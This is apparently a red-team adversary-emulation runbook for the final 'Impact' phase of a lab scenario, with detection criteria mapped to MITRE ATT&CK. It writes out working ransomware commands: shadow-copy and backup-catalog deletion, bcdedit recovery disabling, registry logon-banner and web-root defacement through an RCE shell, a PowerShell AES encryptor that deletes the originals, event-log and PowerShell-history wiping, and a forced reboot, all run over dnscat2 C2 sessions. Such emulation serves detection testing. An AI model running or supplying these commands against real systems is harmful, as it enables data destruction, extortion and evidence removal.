> Impact

# Phase 5 — Impact: Service Disruption, Recovery Inhibition, Defacement & Encryption

## Overview

Phase 5 is the destructive final act of the `iis-apppool-escalation-path` and must
run **after Phase 4 collection and exfiltration are complete**. Having exfiltrated
`ntds.dit`, registry hives, and IIS web configuration files, the operator now
transitions from stealth to maximum impact — the behaviour pattern that defines
double-extortion Crimeware-as-a-Service ransomware campaigns.

All steps in this phase run from two existing sessions that were established in earlier
phases: the `TESTLAB\Administrator` dnscat2 DNS C2 shell on DC01 (Phase 3), and the
`IIS APPPOOL\react.testlab.local` react2shell HTTP shell on IIS01 (Phase 1). No new
payloads or lateral movement are required. No new credentials are needed.

Step 4 (system reboot on IIS01) is the terminal step of the entire scenario. The
react2shell session and the IIS01 dnscat2 session will both be lost when the host
reboots. Do not execute Step 4 until all prior steps — including the Cleanup recording
obligation — have been completed.

| Step | Host | Session | Techniques |
| - | - | - | - |
| Step 1 | DC01 | dnscat2 ghost `RuntimeBroker.exe` (TESTLAB\Administrator) | T1489, T1490 |
| Step 2 | DC01 + IIS01 | dnscat2 (DC01) + react2shell (IIS01) | T1491.001, T1112 |
| Step 3 | DC01 | dnscat2 ghost `RuntimeBroker.exe` (TESTLAB\Administrator) | T1486, T1491.001 |
| Step 4 | IIS01 | dnscat2 ghost `RuntimeBroker.exe` (NT AUTHORITY\SYSTEM) | T1529 |

---

## Step 0 — Setup

### Procedures

- Verify the DC01 dnscat2 C2 session is active

  ```text
  dnscat2> windows
  ```

  - ***Expected Output***

    ```text
    ... Session N: DC01 (TESTLAB\Administrator) ...
    ```

- Verify the IIS01 dnscat2 C2 session is active (from Phase 1)

  ```text
  dnscat2> windows
  ```

  - ***Expected Output***

    ```text
    ... Session M: IIS01 (NT AUTHORITY\SYSTEM) ...
    ```

- Verify the react2shell HTTP session is reachable

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    rce >
    ```

- ☣️ From the DC01 dnscat2 shell, create the encryption test directory and populate it with dummy files

  ```text
  C:\ProgramData> mkdir C:\ProgramData\RansomTest
  C:\ProgramData> powershell -NoProfile -Command "1..5 | ForEach-Object { Set-Content \"C:\ProgramData\RansomTest\document$_.docx\" \"Sensitive document $_ — confidential business data\" }"
  ```

  - ***Expected Output***

    ```text
    (directory created; 5 files written silently)
    ```

- Confirm test files are present

  ```text
  C:\ProgramData> dir C:\ProgramData\RansomTest\
  ```

  - ***Expected Output***

    ```text
     Directory of C:\ProgramData\RansomTest

    <date>  <time>     <size> document1.docx
    <date>  <time>     <size> document2.docx
    <date>  <time>     <size> document3.docx
    <date>  <time>     <size> document4.docx
    <date>  <time>     <size> document5.docx
                   5 File(s)    <size> bytes
    ```

---

## Step 1 — Impact: Service Stop & Inhibit System Recovery (DC01)

### Voice Track

With credential material safely exfiltrated, the attacker shifts to the
pre-encryption preparation sequence that ransomware operators treat as mandatory
before deploying any encryptor: disable services that can restore what will be
destroyed, and lock out any recovery path the victim could use to avoid paying.

The attacker first stops the Print Spooler and Windows Search services using two
different service control interfaces — `sc.exe` and `net.exe` — to match the
multi-vector service termination pattern used by families like Conti and Ryuk, which
maintain hardcoded lists of services to kill before encryption. Neither service is
critical to Active Directory's own operation, so domain authentication remains intact
and the dnscat2 C2 session survives.

Recovery inhibition follows. `vssadmin delete shadows /all /quiet` removes all
remaining Volume Shadow Copies on DC01. Phase 4's VSS shadow was already individually
deleted during Step 1 of that phase; this command sweeps any shadows created by
Windows Backup or third-party backup agents since then. `wbadmin delete catalog`
destroys the Windows Server Backup catalog. Two `bcdedit` calls disable the Windows
Recovery Console boot path, preventing IT staff from booting into WinRE to attempt
system rollback. Together these four commands eliminate every quick-restore option
available to the victim before the encryptor runs.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stop the Print Spooler service via `sc.exe`

  ```text
  C:\ProgramData> sc.exe stop spooler
  ```

  - ***Expected Output***

    ```text
    SERVICE_NAME: spooler
            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
            STATE              : 3  STOP_PENDING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x1
            WAIT_HINT          : 0x4e20
    ```

- ☣️ Stop the Windows Search service via `net.exe`

  ```text
  C:\ProgramData> net.exe stop WSearch /y
  ```

  - ***Expected Output***

    ```text
    The Windows Search service is stopping.
    The Windows Search service was stopped successfully.
    ```

- ☣️ Delete all Volume Shadow Copies on DC01

  ```text
  C:\ProgramData> vssadmin.exe delete shadows /all /quiet
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully deleted 1 shadow copies.
    ```

  > **Note:** If no shadows exist beyond the one already deleted in Phase 4 Step 1,
  > output will be: `No items found that satisfy the query.` This is expected and
  > still produces the target process-creation event.

- ☣️ Delete the Windows Backup Catalog

  ```text
  C:\ProgramData> wbadmin.exe delete catalog -quiet
  ```

  - ***Expected Output***

    ```text
    The backup catalog has been successfully deleted.
    ```

  > **Note:** If Windows Server Backup has never been configured on DC01, output will
  > be: `The backup catalog could not be found or is damaged.` The command still
  > executes and produces the target Sysmon Event 1.

- ☣️ Disable Windows Recovery Console automatic repair at boot

  ```text
  C:\ProgramData> bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
  C:\ProgramData> bcdedit.exe /set {default} recoveryenabled no
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    The operation completed successfully.
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1489 | Service Stop | Windows | `sc.exe stop spooler` spawned from `RuntimeBroker.exe` ghost (dnscat2 SYSTEM parent) on DC01; Windows System Event 7036: Print Spooler service entered stopped state | Calibrated - Not Benign | `sc.exe stop spooler` issued from the dnscat2 domain-admin shell on DC01; Print Spooler selected as a non-critical, realistic ransomware service termination target | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1489 | Service Stop | Windows | `net.exe stop WSearch` spawned from `RuntimeBroker.exe` ghost on DC01; Windows System Event 7036: Windows Search service entered stopped state | Calibrated - Not Benign | `net.exe stop WSearch` issued from the same dnscat2 shell — second stop command using a distinct service control interface (`net.exe` vs `sc.exe`), matching the multi-vector service kill pattern used by Conti and Ryuk | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1490 | Inhibit System Recovery | Windows | `vssadmin.exe delete shadows /all /quiet` spawned from `RuntimeBroker.exe` ghost on DC01; Sysmon Event 1 command line matches ransomware-canonical VSS deletion pattern | Calibrated - Not Benign | `vssadmin delete shadows /all /quiet` deletes all remaining VSS snapshots on DC01 after Phase 4 collection is complete; eliminates victim's VSS-based restore path before encryption | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1490 | Inhibit System Recovery | Windows | `wbadmin.exe delete catalog -quiet` spawned from `RuntimeBroker.exe` ghost on DC01; Sysmon Event 1; Windows Backup event log: catalog deletion recorded | Calibrated - Not Benign | `wbadmin delete catalog` destroys the Windows Server Backup catalog, removing scheduled backup history and preventing catalog-based restore | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1490 | Inhibit System Recovery | Windows | `bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures` and `bcdedit.exe /set {default} recoveryenabled no` each spawned from `RuntimeBroker.exe` ghost on DC01; Sysmon Event 1 for each invocation; BCD store modification disabling WinRE | Calibrated - Not Benign | Two `bcdedit` calls disable the Windows Recovery Console boot path; prevents IT staff from using WinRE to roll back DC01 after encryption | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |

---

## Step 2 — Impact: Internal Defacement (DC01 + IIS01)

### Voice Track

The attacker now announces the intrusion through two independent defacement channels,
using a mechanism that is visible to every domain user (DC01 login banner) and to every
browser that reaches the organisation's internal web applications (IIS01 web root).

On DC01, the `LegalNoticeCaption` and `LegalNoticeText` registry keys under
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` are modified to
display a ransom message at the Windows logon screen. These keys are applied
domain-wide: any user logging into a domain-joined machine will see the notice before
their credentials are accepted, because the domain's Group Policy pulls the domain
controller's registry values. The attacker also drops ransom note text files at
`C:\Users\Administrator\Desktop` and the `C:\` root so that the message is visible
from any Explorer or shell session on DC01.

On IIS01, the attacker uses the existing react2shell Node.js eval channel to write a
ransom note HTML page directly to the `upload.testlab.local` web root. The AppPool
identity (`IIS APPPOOL\react.testlab.local`) has write access to its own web root, so
no privilege escalation is needed for this operation. From this point, any browser
navigating to `http://upload.testlab.local` receives the ransom page instead of the
upload portal.

### Procedures

- ☣️ From the DC01 dnscat2 shell, set the logon-screen ransom notice in the registry

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeCaption -Value '!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!' -Type String -Force; Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeText -Value 'Your network has been compromised. All data has been exfiltrated and encrypted. To recover your files contact us at: ransomgroup.onion within 72 hours.' -Type String -Force"
  ```

  - ***Expected Output***

    ```text
    (no output — registry values set silently)
    ```

- Verify the registry values were written

  ```text
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeCaption
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeText
  ```

  - ***Expected Output***

    ```text
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeCaption    REG_SZ    !!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeText    REG_SZ    Your network has been compromised...
    ```

- ☣️ Drop ransom note text files on DC01

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'; Set-Content 'C:\Users\Administrator\Desktop\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'"
  ```

  - ***Expected Output***

    ```text
    (no output — files written silently)
    ```

- ☣️ From the react2shell session on IIS01, write a ransom note HTML page to the upload portal web root

  ```
  rce > eval "require('fs').writeFileSync('C:\\\\inetpub\\\\upload.testlab.local\\\\index.html', '<html><head><title>ENCRYPTED</title></head><body style=\"background:#000;color:#f00;font-family:monospace;padding:40px\"><h1>!!! YOUR NETWORK HAS BEEN COMPROMISED !!!</h1><p>All files on this network have been encrypted and exfiltrated.</p><p>Contact us at <b>ransomgroup.onion</b> within 72 hours to negotiate decryption.</p></body></html>')"
  ```

  - ***Expected Output***

    ```text
    (no output — file written via eval; react2shell returns empty result on successful fs.writeFileSync)
    ```

- Verify the web defacement from the attacker machine

  ```bash
  curl -s http://upload.testlab.local/ | head -5
  ```

  - ***Expected Output***

    ```text
    <html><head><title>ENCRYPTED</title></head><body style="background:#000;...
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `node.exe` (IIS APPPOOL\react.testlab.local) creates `index.html` in `C:\inetpub\upload.testlab.local\` via `fs.writeFileSync` called through react2shell eval channel; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | react2shell eval executes `fs.writeFileSync` to overwrite the upload portal landing page with a ransom HTML page on IIS01; no child process spawned — write occurs entirely within `node.exe` | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py eval path](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |

---

## Step 3 — Impact: Data Encrypted for Impact (DC01)

### Voice Track

With recovery paths disabled and the ransom notice deployed, the attacker runs the
encryption step. A PowerShell one-liner constructs an AES-256-CBC encryptor using the
.NET `System.Security.Cryptography.Aes` class, generates a random key and IV per
execution, then iterates over files in the staged test directory, encrypts each file's
content in memory via a `CryptoStream`, writes the ciphertext to a `.locked` variant,
and deletes the plaintext original.

The encryption is scoped to `C:\ProgramData\RansomTest\`, the directory created in
Step 0 for this purpose. In a real ransomware deployment, the file walk would target
broad extension lists across all volumes and mapped drives; the scoped path used here
produces the same telemetry fingerprint — AES key generation in Script Block Logging,
bulk file renames in Sysmon, and original-file deletion events — while keeping the
lab intact for subsequent runs.

PowerShell Script Block Logging (Event 4104) is the primary detection signal: the
block records the full invocation including the `[System.Security.Cryptography.Aes]`
class instantiation, `GenerateKey()`, `GenerateIV()`, and `CryptoStream` write — the
canonical in-process encryption pattern used by ransomware families that embed a .NET
encryptor. The second signal is Sysmon Event 2 (file creation) for each `.locked` file
paired with Event 23 (file deletion) for each plaintext original removed.

A ransom note `README_DECRYPT.txt` is dropped inside the encrypted directory as the
final write, consistent with ransomware behaviour of co-locating the note with
encrypted files to ensure visibility.

### Procedures

- ☣️ From the DC01 dnscat2 shell, AES-256-CBC encrypt all files in the test directory and rename with `.locked` extension

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$aes=[System.Security.Cryptography.Aes]::Create();$aes.KeySize=256;$aes.GenerateKey();$aes.GenerateIV();Get-ChildItem 'C:\ProgramData\RansomTest' -File|Where-Object{$_.Extension -ne '.locked'}|ForEach-Object{$b=[IO.File]::ReadAllBytes($_.FullName);$e=$aes.CreateEncryptor();$m=New-Object IO.MemoryStream;$c=New-Object Security.Cryptography.CryptoStream($m,$e,[Security.Cryptography.CryptoStreamMode]::Write);$c.Write($b,0,$b.Length);$c.FlushFinalBlock();[IO.File]::WriteAllBytes($_.FullName+'.locked',$m.ToArray());Remove-Item $_.FullName -Force}"
  ```

  - ***Expected Output***

    ```text
    (no output — encryption loop runs silently; all five files processed)
    ```

- ☣️ Drop the ransom note inside the encrypted directory

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\ProgramData\RansomTest\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'"
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

- Verify the directory: plaintext files replaced by `.locked` variants and ransom note present

  ```text
  C:\ProgramData> dir C:\ProgramData\RansomTest\
  ```

  - ***Expected Output***

    ```text
     Directory of C:\ProgramData\RansomTest

    <date>  <time>     <size> document1.docx.locked
    <date>  <time>     <size> document2.docx.locked
    <date>  <time>     <size> document3.docx.locked
    <date>  <time>     <size> document4.docx.locked
    <date>  <time>     <size> document5.docx.locked
    <date>  <time>       <size> README_DECRYPT.txt
                   6 File(s)    <size> bytes
    ```

- Verify the encrypted content is ciphertext (no plaintext visible)

  ```text
  C:\ProgramData> powershell -NoProfile -Command "[IO.File]::ReadAllBytes('C:\ProgramData\RansomTest\document1.docx.locked')[0..7] | ForEach-Object { '{0:X2}' -f $_ }"
  ```

  - ***Expected Output***

    ```text
    (8 random hex bytes — no readable text; AES-CBC output has no recognizable header)
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1486 | Data Encrypted for Impact | Windows | PowerShell Script Block Logging Event 4104 on DC01: `[System.Security.Cryptography.Aes]::Create()`, `GenerateKey()`, `GenerateIV()`, `CryptoStream` write loop visible in script block; `powershell.exe` parent is `RuntimeBroker.exe` ghost; Sysmon Event 11: `.locked`-extension files created in `C:\ProgramData\RansomTest\`; Sysmon Event 23: plaintext originals deleted immediately after each encrypted variant is written | Calibrated - Not Benign | PowerShell AES-256-CBC encryption loop runs from the dnscat2 domain-admin shell on DC01; each file in `C:\ProgramData\RansomTest\` is encrypted in-memory via `CryptoStream`, written as `<filename>.locked`, then deleted — canonical .NET ransomware encryptor pattern | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` in `C:\ProgramData\RansomTest\`; file name matches ransomware ransom-note naming convention; co-located with `.locked` encrypted files | Calibrated - Not Benign | `Set-Content` drops `README_DECRYPT.txt` inside the encrypted test directory; ransom note co-location with encrypted files matches behaviour of Akira, LockBit, BlackBasta and other double-extortion ransomware families | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |

---

> **Optional Step** — Execute after Step 3 encryption and before Step 4 reboot. Both sub-steps are optional independently. Note that clearing event logs is a high-confidence detection signal on its own — if the objective is to test whether the product detects the log-clear event, run this step; if the goal is to keep post-encryption forensic state intact for the evaluator, skip it.

## Optional Step — Indicator Removal (DC01)

### Voice Track

With encryption complete and ransom notes placed, the attacker performs a final
forensic-reduction sweep before triggering the IIS01 reboot. The sequence mirrors
the post-encryption cleanup documented in Ryuk, Conti, and LockBit post-incident
reports: clear high-value event logs to hamper timeline reconstruction, then erase
the PowerShell command history that recorded every step of the Phase 5 operation.

Three `wevtutil cl` calls target the Security, System, and Application event logs.
These are the three channels forensic analysts pull first — Security for logon and
privilege events, System for service state changes and boot events, Application for
application-layer anomalies. The Security log clear triggers Windows Event 1102
(`The audit log was cleared`), a canonical SOC alert that is generated by the OS
before the log is emptied; if the lab has log forwarding enabled, this event reaches
the SIEM before it is wiped from disk. The `wevtutil.exe` process-creation events
themselves also persist in the Sysmon event stream on the forwarding collector.

The PSReadLine history deletion targets `ConsoleHost_history.txt` under the
Administrator's AppData path. This file retains every PowerShell command issued
across all sessions — including the Steps 1–3 service-stop, encryption, and
defacement commands. Deleting it removes the on-disk record of the full Phase 5
command sequence.

### Procedures

- ☣️ From the DC01 dnscat2 shell, clear the Security, System, and Application event logs

  ```text
  C:\ProgramData> wevtutil.exe cl Security
  C:\ProgramData> wevtutil.exe cl System
  C:\ProgramData> wevtutil.exe cl Application
  ```

  - ***Expected Output***

    ```text
    (no output — wevtutil cl returns silently on success)
    ```

  > **Note:** Windows Security Event 1102 ("The audit log was cleared") is written
  > to the Security log immediately before the clear takes effect. If the lab has
  > SIEM log forwarding enabled, this event is captured in the forwarding pipeline
  > before it is erased locally. The Sysmon process-creation events for each
  > `wevtutil.exe` call also persist on the Sysmon collector regardless of whether
  > the Windows event log is cleared on DC01.

- ☣️ Delete the PSReadLine history file on DC01 to erase the PowerShell command record for this session

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue"
  ```

  - ***Expected Output***

    ```text
    (no output — Remove-Item returns silently when the file is deleted successfully)
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs | Windows | Sysmon Event 1 on DC01: `wevtutil.exe cl Security`, `wevtutil.exe cl System`, `wevtutil.exe cl Application` each spawned from `RuntimeBroker.exe` ghost (TESTLAB\Administrator); Windows Security Event 1102 generated when Security log is cleared; Windows System Event 104 for System and Application log clears | Calibrated - Not Benign | Three `wevtutil cl` calls sequentially clear Security, System, and Application logs on DC01 after encryption and before reboot — post-encryption log wipe matching the Ryuk, Conti, and LockBit pre-reboot cleanup sequence | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Defense Evasion | T1070.003 | Indicator Removal: Clear Command History | Windows | Sysmon Event 23 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) deletes `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`; PowerShell Script Block Log Event 4104: `Remove-Item (Get-PSReadlineOption).HistorySavePath` | Calibrated - Not Benign | `Remove-Item (Get-PSReadlineOption).HistorySavePath` deletes the persistent PSReadLine history file on DC01 — erases the on-disk record of all prior PowerShell commands issued through the dnscat2 shell during Phase 5 | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |

---

## Step 4 — Impact: System Reboot (IIS01)

> ⚠️ **This is the terminal step of the entire `iis-apppool-escalation-path` scenario.**
> Executing this step will terminate the IIS01 dnscat2 C2 session, the react2shell
> HTTP session, and the IIS APPPOOL identity. The DC01 dnscat2 session remains
> unaffected. Do not proceed until all prior steps — including documentation of
> artifacts for Cleanup.md — are complete. Cancel with `shutdown /a` on IIS01 within
> the 60-second window if necessary.

### Voice Track

As the final act, the attacker forces a reboot of IIS01. In ransomware operations,
rebooting a compromised host after the encryption and defacement sequence serves two
purposes: it forces any running services — including security monitoring agents and
EDR sensors — to restart from a post-encryption system state, and it ensures that
end users who connect to the host immediately encounter the defaced web pages and
ransom notices rather than a cached pre-attack state.

The reboot is issued via `shutdown.exe /r /t 60` from the IIS01 dnscat2 SYSTEM
session, with a 60-second delay that gives the operator a window to abort using
`shutdown /a` if the step is triggered by mistake. The delay also produces a distinct
Windows Event Log artifact: Security Event 4609 and System Event 1074 both record
the initiating process and the 60-second countdown before system restart.

After the reboot triggers, both C2 channels to IIS01 — the dnscat2 DNS session and
the react2shell HTTP session — are lost. The DC01 dnscat2 session is independent of
IIS01 and continues to operate normally.

### Procedures

- ☣️ **FINAL STEP — NO RECOVERY AFTER EXECUTION.** From the IIS01 dnscat2 SYSTEM shell, schedule a system reboot with a 60-second cancellable window

  ```text
  C:\Windows\system32> shutdown.exe /r /t 60 /c "System reboot initiated"
  ```

  - ***Expected Output***

    ```text
    (no output in shell; Windows Event Log records Event 1074 on IIS01)
    ```

- Monitor Windows Event Log on IIS01 for confirmation (from DC01 dnscat2 shell, within the 60-second window)

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Get-WinEvent -ComputerName IIS01 -FilterHashtable @{LogName='System';Id=1074} -MaxEvents 1 | Select-Object -ExpandProperty Message"
  ```

  - ***Expected Output***

    ```text
    The process shutdown.exe has initiated the restart of computer IIS01 on behalf of user NT AUTHORITY\SYSTEM for the following reason: No title for this reason could be found...
    ```

- If abort is needed within the 60-second window, cancel the reboot from any IIS01 session

  ```text
  C:\Windows\system32> shutdown.exe /a
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1529 | System Shutdown/Reboot | Windows | Sysmon Event 1 on IIS01: `shutdown.exe /r /t 60` spawned from `RuntimeBroker.exe` ghost (dnscat2 SYSTEM parent); Windows System Event 1074: `shutdown.exe` initiated system restart on behalf of `NT AUTHORITY\SYSTEM`; Windows Security Event 4609 records the shutdown call sequence | Calibrated - Not Benign | `shutdown.exe /r /t 60` issued from the IIS01 dnscat2 SYSTEM session as the terminal impact step; forces reboot of the web server after encryption and defacement are complete, terminating both IIS01 C2 channels | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---

## End of Phase

### Procedures

- Record all artifacts created in this phase for cleanup reference (see `Cleanup.md`):
  - `C:\ProgramData\RansomTest\` — test directory containing `.locked` files and `README_DECRYPT.txt` on DC01
  - `C:\README_DECRYPT.txt` — ransom note on DC01
  - `C:\Users\Administrator\Desktop\README_DECRYPT.txt` — ransom note on DC01 desktop
  - `C:\inetpub\upload.testlab.local\index.html` — defaced web root on IIS01
  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption` on DC01
  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText` on DC01
  - BCD: `bootstatuspolicy` and `recoveryenabled` modified on DC01 (reverse with `bcdedit /set {default} bootstatuspolicy DisplayAllFailures` and `bcdedit /set {default} recoveryenabled yes`)
  - Services: `spooler` and `WSearch` stopped on DC01 (restart with `sc start spooler` and `net start WSearch`)
